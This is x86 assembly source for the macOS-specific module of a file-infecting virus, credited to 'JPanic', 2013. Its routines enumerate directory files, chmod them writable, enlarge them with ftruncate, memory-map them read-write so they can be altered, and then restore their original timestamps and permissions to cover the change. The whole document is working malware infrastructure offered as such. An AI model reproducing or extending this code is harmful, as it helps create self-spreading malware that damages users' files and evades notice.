;= OSX Virus Procedure Implementation (c) 2013 JPanic =====================
;
; Provides Virus Operating System specific routines for OSX.
;
; PUBLICS:
;	OSX_Init()
;	OSX_FindFirst()
;	OSX_FindNext()
;	OSX_FindClose()
;	OSX_OpenFile()
;	OSX_Close()
;	OSX_Exit()
;	OSX_DirSetup
;	OSX_Chdir
;
; Most arguments are passed implicitly through the heap.
;
;= Directive Warez ========================================================
	
	.486	
	locals @@
	.model flat
	
include inc\osx.inc
include inc\short.inc
include vheap.ash

extrn	SetupDirRegs:PROC
	
;= Code Warez =============================================================
        include codeseg.ash

; = OSX_Init ============================================================
;
; Must Clear CF.
;
;--------------------------------------------------------------------------
; OSX_Init just returns NC..
PUBLIC	OSX_Init
OSX_Init		PROC
			push	eax
			push	25
			pop	eax			; geteuid()
			int	80h
			mov	[vheap.dwEUID],eax
			pop	edi
			xor	eax,eax
			cdq
			push	eax				; offset
			push	eax				; offset
			push	-1				; fd
			mov	dh,10h
			push	edx				; flags = MAP_ANON
			push	osx$PROT_READ + osx$PROT_WRITE	; prot
			mov	dh,(osx$bigbuf_size shr 8) AND 0FFh
			push	edx				; len
			push	eax				; addr
			push	eax
			mov	al,197				; mmap(...)
			int	80h
			lea	esp,[esp+(8*4)]
			jc	@@ret
			mov	dwo [vheap.dwBigBuf],eax			
		@@ret:	ret
OSX_Init		ENDP

; = OSX_Exit ============================================================
;
; Free BigBuf.
;------------------------------------------------------------------------
PUBLIC	OSX_Exit
OSX_Exit		PROC
			;lea	esi,[vheap.dwDirCWD]
			lodsd
			xchg	eax,ecx
			call	$close
			lodsd
			xchg	eax,ecx
			call	$close
			lodsd
			xchg	eax,ecx
			call	$close
			;mov	ecx,[vheap.dwBigBuf]
			lodsd
			xchg	eax,ecx
			jecxz	@@nofree
				push	L osx$bigbuf_size	; len
				push	ecx			; addr
				push	73
				pop	eax			; munmap(...)
				push	eax
				int	80h
				add	esp,(3 * 4)
		@@nofree:
			ret

OSX_Exit		ENDP

;= OSX_FindFirst ========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	OSX_FindFirst
OSX_FindFirst		PROC
			push	osx$O_RDONLY 			; O_RDONLY		
			lea	eax,[vheap.dwDOT]
			push	eax				; char *path
			push	L 5				; open(...)
			pop	eax
			push	eax
			int	80h
			lea	esp,[esp+(3 * 4)]			
			jb	@@jb_ret_cf$1
			mov	dwo [vheap.dwFindHandle],eax			
	$OSXReadDirEntry:			
			mov	eax,dwo [vheap.dwFindHandle]
			lea	ebx,[OSXHeap.osx$dirbasep]
			mov	ecx,[vheap.dwBigBuf]
			mov	[OSXHeap.osx$curdirbufptr],ecx
			push	ebx				; *basep
			push	size osx$dirp			; nBytes			
			push	ecx				; *buf
			push	eax				; fd
			push	eax
			xor	eax,eax
			mov	al,196				; getdirentries(...)
			int	80h			
			lea	esp,[esp+(5*4)]
		@@jb_ret_cf$1:
			jb	$ret_cf
			test	eax,eax
			jz	$ret_cf
			add	eax,ecx
			mov	[OSXHeap.osx$maxdirbufptr],eax
		$OSXNextDirEntry:			
			; ECX = curdirbufptr
				cmp	dwo [ecx.osx$d_fileno],0
		   		je	OSX_FindNext
				cmp	by [ecx.osx$d_type],osx$DT_REG				
				jne	@@jnz_findnext$1
				lea	esi,[OSXHeap.osx$statbuf]
				push	esi				; buf
				lea	ebx,[ecx.osx$d_name]
				push	ebx				; path
				push	ebx				
				mov	eax,338				; stat64(...)
				int	80h
				add	esp,(3 * 4)
				mov	dx,osx$S_IFMT
				and	edx,dwo [esi.osx$st_mode]
				cmp	dx,osx$S_IFREG
			@@jnz_findnext$1:
				jne	@@jnz_findnext$2
				test	dwo [esi.osx$st_flags],osx$BAD_STFLAGS
			@@jnz_findnext$2:
				jne	OSX_FindNext
				xor	ecx,ecx				
				.if	dwo [esi.osx$st_size.dwHI] == ecx
					mov	ecx,[esi.osx$st_size.dwLO]
				.endif				
	$ret_nc:	test	al,1
			org	$-1
	$ret_cf:	stc
	$ret:		ret
OSX_FindFirst		ENDP

;= OSX_FindNext =========================================================
;
; Outputs:
;	CF on failure.
;	ECX = File Size.
;
;--------------------------------------------------------------------------
PUBLIC	OSX_FindNext
OSX_FindNext		PROC
			mov	ecx,[OSXHeap.osx$curdirbufptr]
			movzx	eax,[ecx.osx$d_reclen]
			add	ecx,eax			; ecx = next dirent
			mov	[OSXHeap.osx$curdirbufptr],ecx
			cmp	ecx,[OSXHeap.osx$maxdirbufptr]
			jb	$OSXNextDirEntry
			jmp	$OSXReadDirEntry
OSX_FindNext		ENDP

;= OSX_FindClose ========================================================
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC	OSX_FindClose
OSX_FindClose		PROC
			mov	ecx,[vheap.dwFindHandle]
		$close:	jecxz	@@ret
			push	ecx				; int fd
			push	eax
			push	L 6
			pop	eax
			int	80h				; - close(..)
			pop	eax
			pop	eax
		@@ret:	ret			
OSX_FindClose		ENDP

;= OSX_OpenFile =========================================================
;
; Outputs:
;	CF on error.
;	EAX = Mapped file on success.
;
;--------------------------------------------------------------------------
PUBLIC	OSX_OpenFile
OSX_OpenFile		PROC			
			mov	esi,[OSXHeap.osx$curdirbufptr]
			lea	ebx,[esi.osx$d_name]
			mov	ecx,[OSXHeap.osx$statbuf.osx$st_uid]
			cmp	ecx,[vheap.dwEUID]
			jne	@@nochmod
				movzx	eax,wo [OSXHeap.osx$statbuf.osx$st_mode]				
				mov	[vheap.dwSavedFMode],eax
				or	ax,osx$S_IRUSR+osx$S_IWUSR
				push	eax	; mode
				push	ebx	; path
				push	L 15
				pop	eax	; chmod(...)
				push	eax
				int	80h
				add	esp,(3	* 4)
		@@nochmod:			
			push	L osx$O_RDWR			; oflag
			push	ebx				; path
			push	L 5
			pop	eax				; open(...)
			push	eax
			int	80h
			lea	esp,[esp+(3 * 4)]
			jb	$restore_chmod                        
			mov	[vheap.dwFileHandle],eax			
			xchg	eax,ebx			
			xor	eax,eax
			mov	al,201			; ftruncate(...)			
                        cdq
			push	edx			; length.hi
                        mov     dh,30h
                        add     edx,[vheap.dwFileSize]
			mov	edi,edx
			push	edx			; length.lo
			push	ebx			; fildes
			push	eax
			int	80h
			lea	esp,[esp+(4*4)]
			jb	$restore_close
			push	eax					; offset (hi)
			push	eax					; offset (lo)
			push	ebx					; fd			
			push	L (osx$MAP_FILE+osx$MAP_SHARED)		; flags
			push	osx$PROT_READ + osx$PROT_WRITE		; prot			
			and	edi,-4096
			push	edi					; len
			mov	[vheap.dwMappedSize],edi
			push	eax					; addr
			push	eax
			mov	al,197					; mmap(...)
			int	80h
			lea	esp,[esp+(8*4)]			
			mov	[vheap.dwMappedFile],eax
			jb	$restore_size			
			ret			
OSX_OpenFile		ENDP

;= OSX_CloseFile ========================================================
;
; Outputs:
;	None. (returns CF as it is used by OSX_OpenFile on error).
;
;--------------------------------------------------------------------------
PUBLIC	OSX_CloseFile
OSX_CloseFile		PROC            
			push	dwo [vheap.dwMappedSize]	; len
			push	dwo [vheap.dwMappedFile]	; addr
			push	73
			pop	eax				; munmap(...)
			push	eax
			int	80h
			add	esp,(3 * 4)
	$restore_size:	
			mov     ebx,[vheap.dwFileHandle]
                        mov     ecx,[vheap.dwFileSize]
			xor	eax,eax
			mov	al,201			; ftruncate(...)			
                        cdq
			push	edx			; length.hi
                        push	ecx			; length.lo
			push	ebx			; fildes
			push	eax
			int	80h
			add	esp,(4*4)
	$restore_close:
			push	ebx				; int fd
			push	eax
			push	L 6
			pop	eax
			int	80h				; - close(..)
			pop	eax
			pop	eax
			mov	esi,[OSXHeap.osx$curdirbufptr]
			lea	ebx,[esi.osx$d_name]
			lea	edi,[OSXHeap.osx$statbuf.osx$st_atimespec]
			push	edi	; times
			push	ebx	; path
			push	L 138
			pop	eax	; utimes(...)
			push	eax
			int	80h
			add	esp,(3 * 4)
	$restore_chmod:
			mov	ecx,[vheap.dwSavedFMode]
			jecxz	@@nochmod				
				mov	esi,[OSXHeap.osx$curdirbufptr]
				lea	ebx,[esi.osx$d_name]
				push	ecx	; mode
				push	ebx	; path
				push	L 15
				pop	eax	; chmod(...)
				push	eax
				int	80h
				add	esp,(3*4)
		@@nochmod:
			stc
			ret			
OSX_CloseFile		ENDP

;= OSX_Chdir ==============================================================
;
; ebx = fd Dir
; returns CF on error.
;
;--------------------------------------------------------------------------
PUBLIC OSX_Chdir
OSX_Chdir		PROC
			push	ebx	; fd dir
			push	13
			pop	eax
			push	eax
			int	80h	; fchdir(...)
			pop	eax
			pop	eax
			ret
OSX_Chdir		ENDP

;= OSX_DirSetup ==========================================================
;
; Outputs:
;	dwCWD, dwDirA, dwDirB
;
;-------------------------------------------------------------------------
PUBLIC	OSX_DirSetup
OSX_DirSetup		PROC
			;lea	edi,[vheap.dwDirCWD]		; edi: dest
			;call	SetupDirRegs
			; ecx = CWD (.), esi = DirA, edx = DirB.
			xchg	eax,ecx
			call	OpenDir
			xchg	eax,esi
			call	OpenDir
			xchg	eax,edx
			;call	OpenDir
			;ret
OSX_DirSetup		ENDP

;eax = path
OpenDir			PROC
			push	osx$O_RDONLY 			; O_RDONLY
			push	eax				; char *path
			push	L 5				; open(...)
			pop	eax
			push	eax
			int	80h
			lea	esp,[esp+(3 * 4)]			
			jnb	@@s
			xor	eax,eax
		@@s:	stosd			
			ret
OpenDir			ENDP
		
;==========================================================================
                        ENDS
			END
;==========================================================================
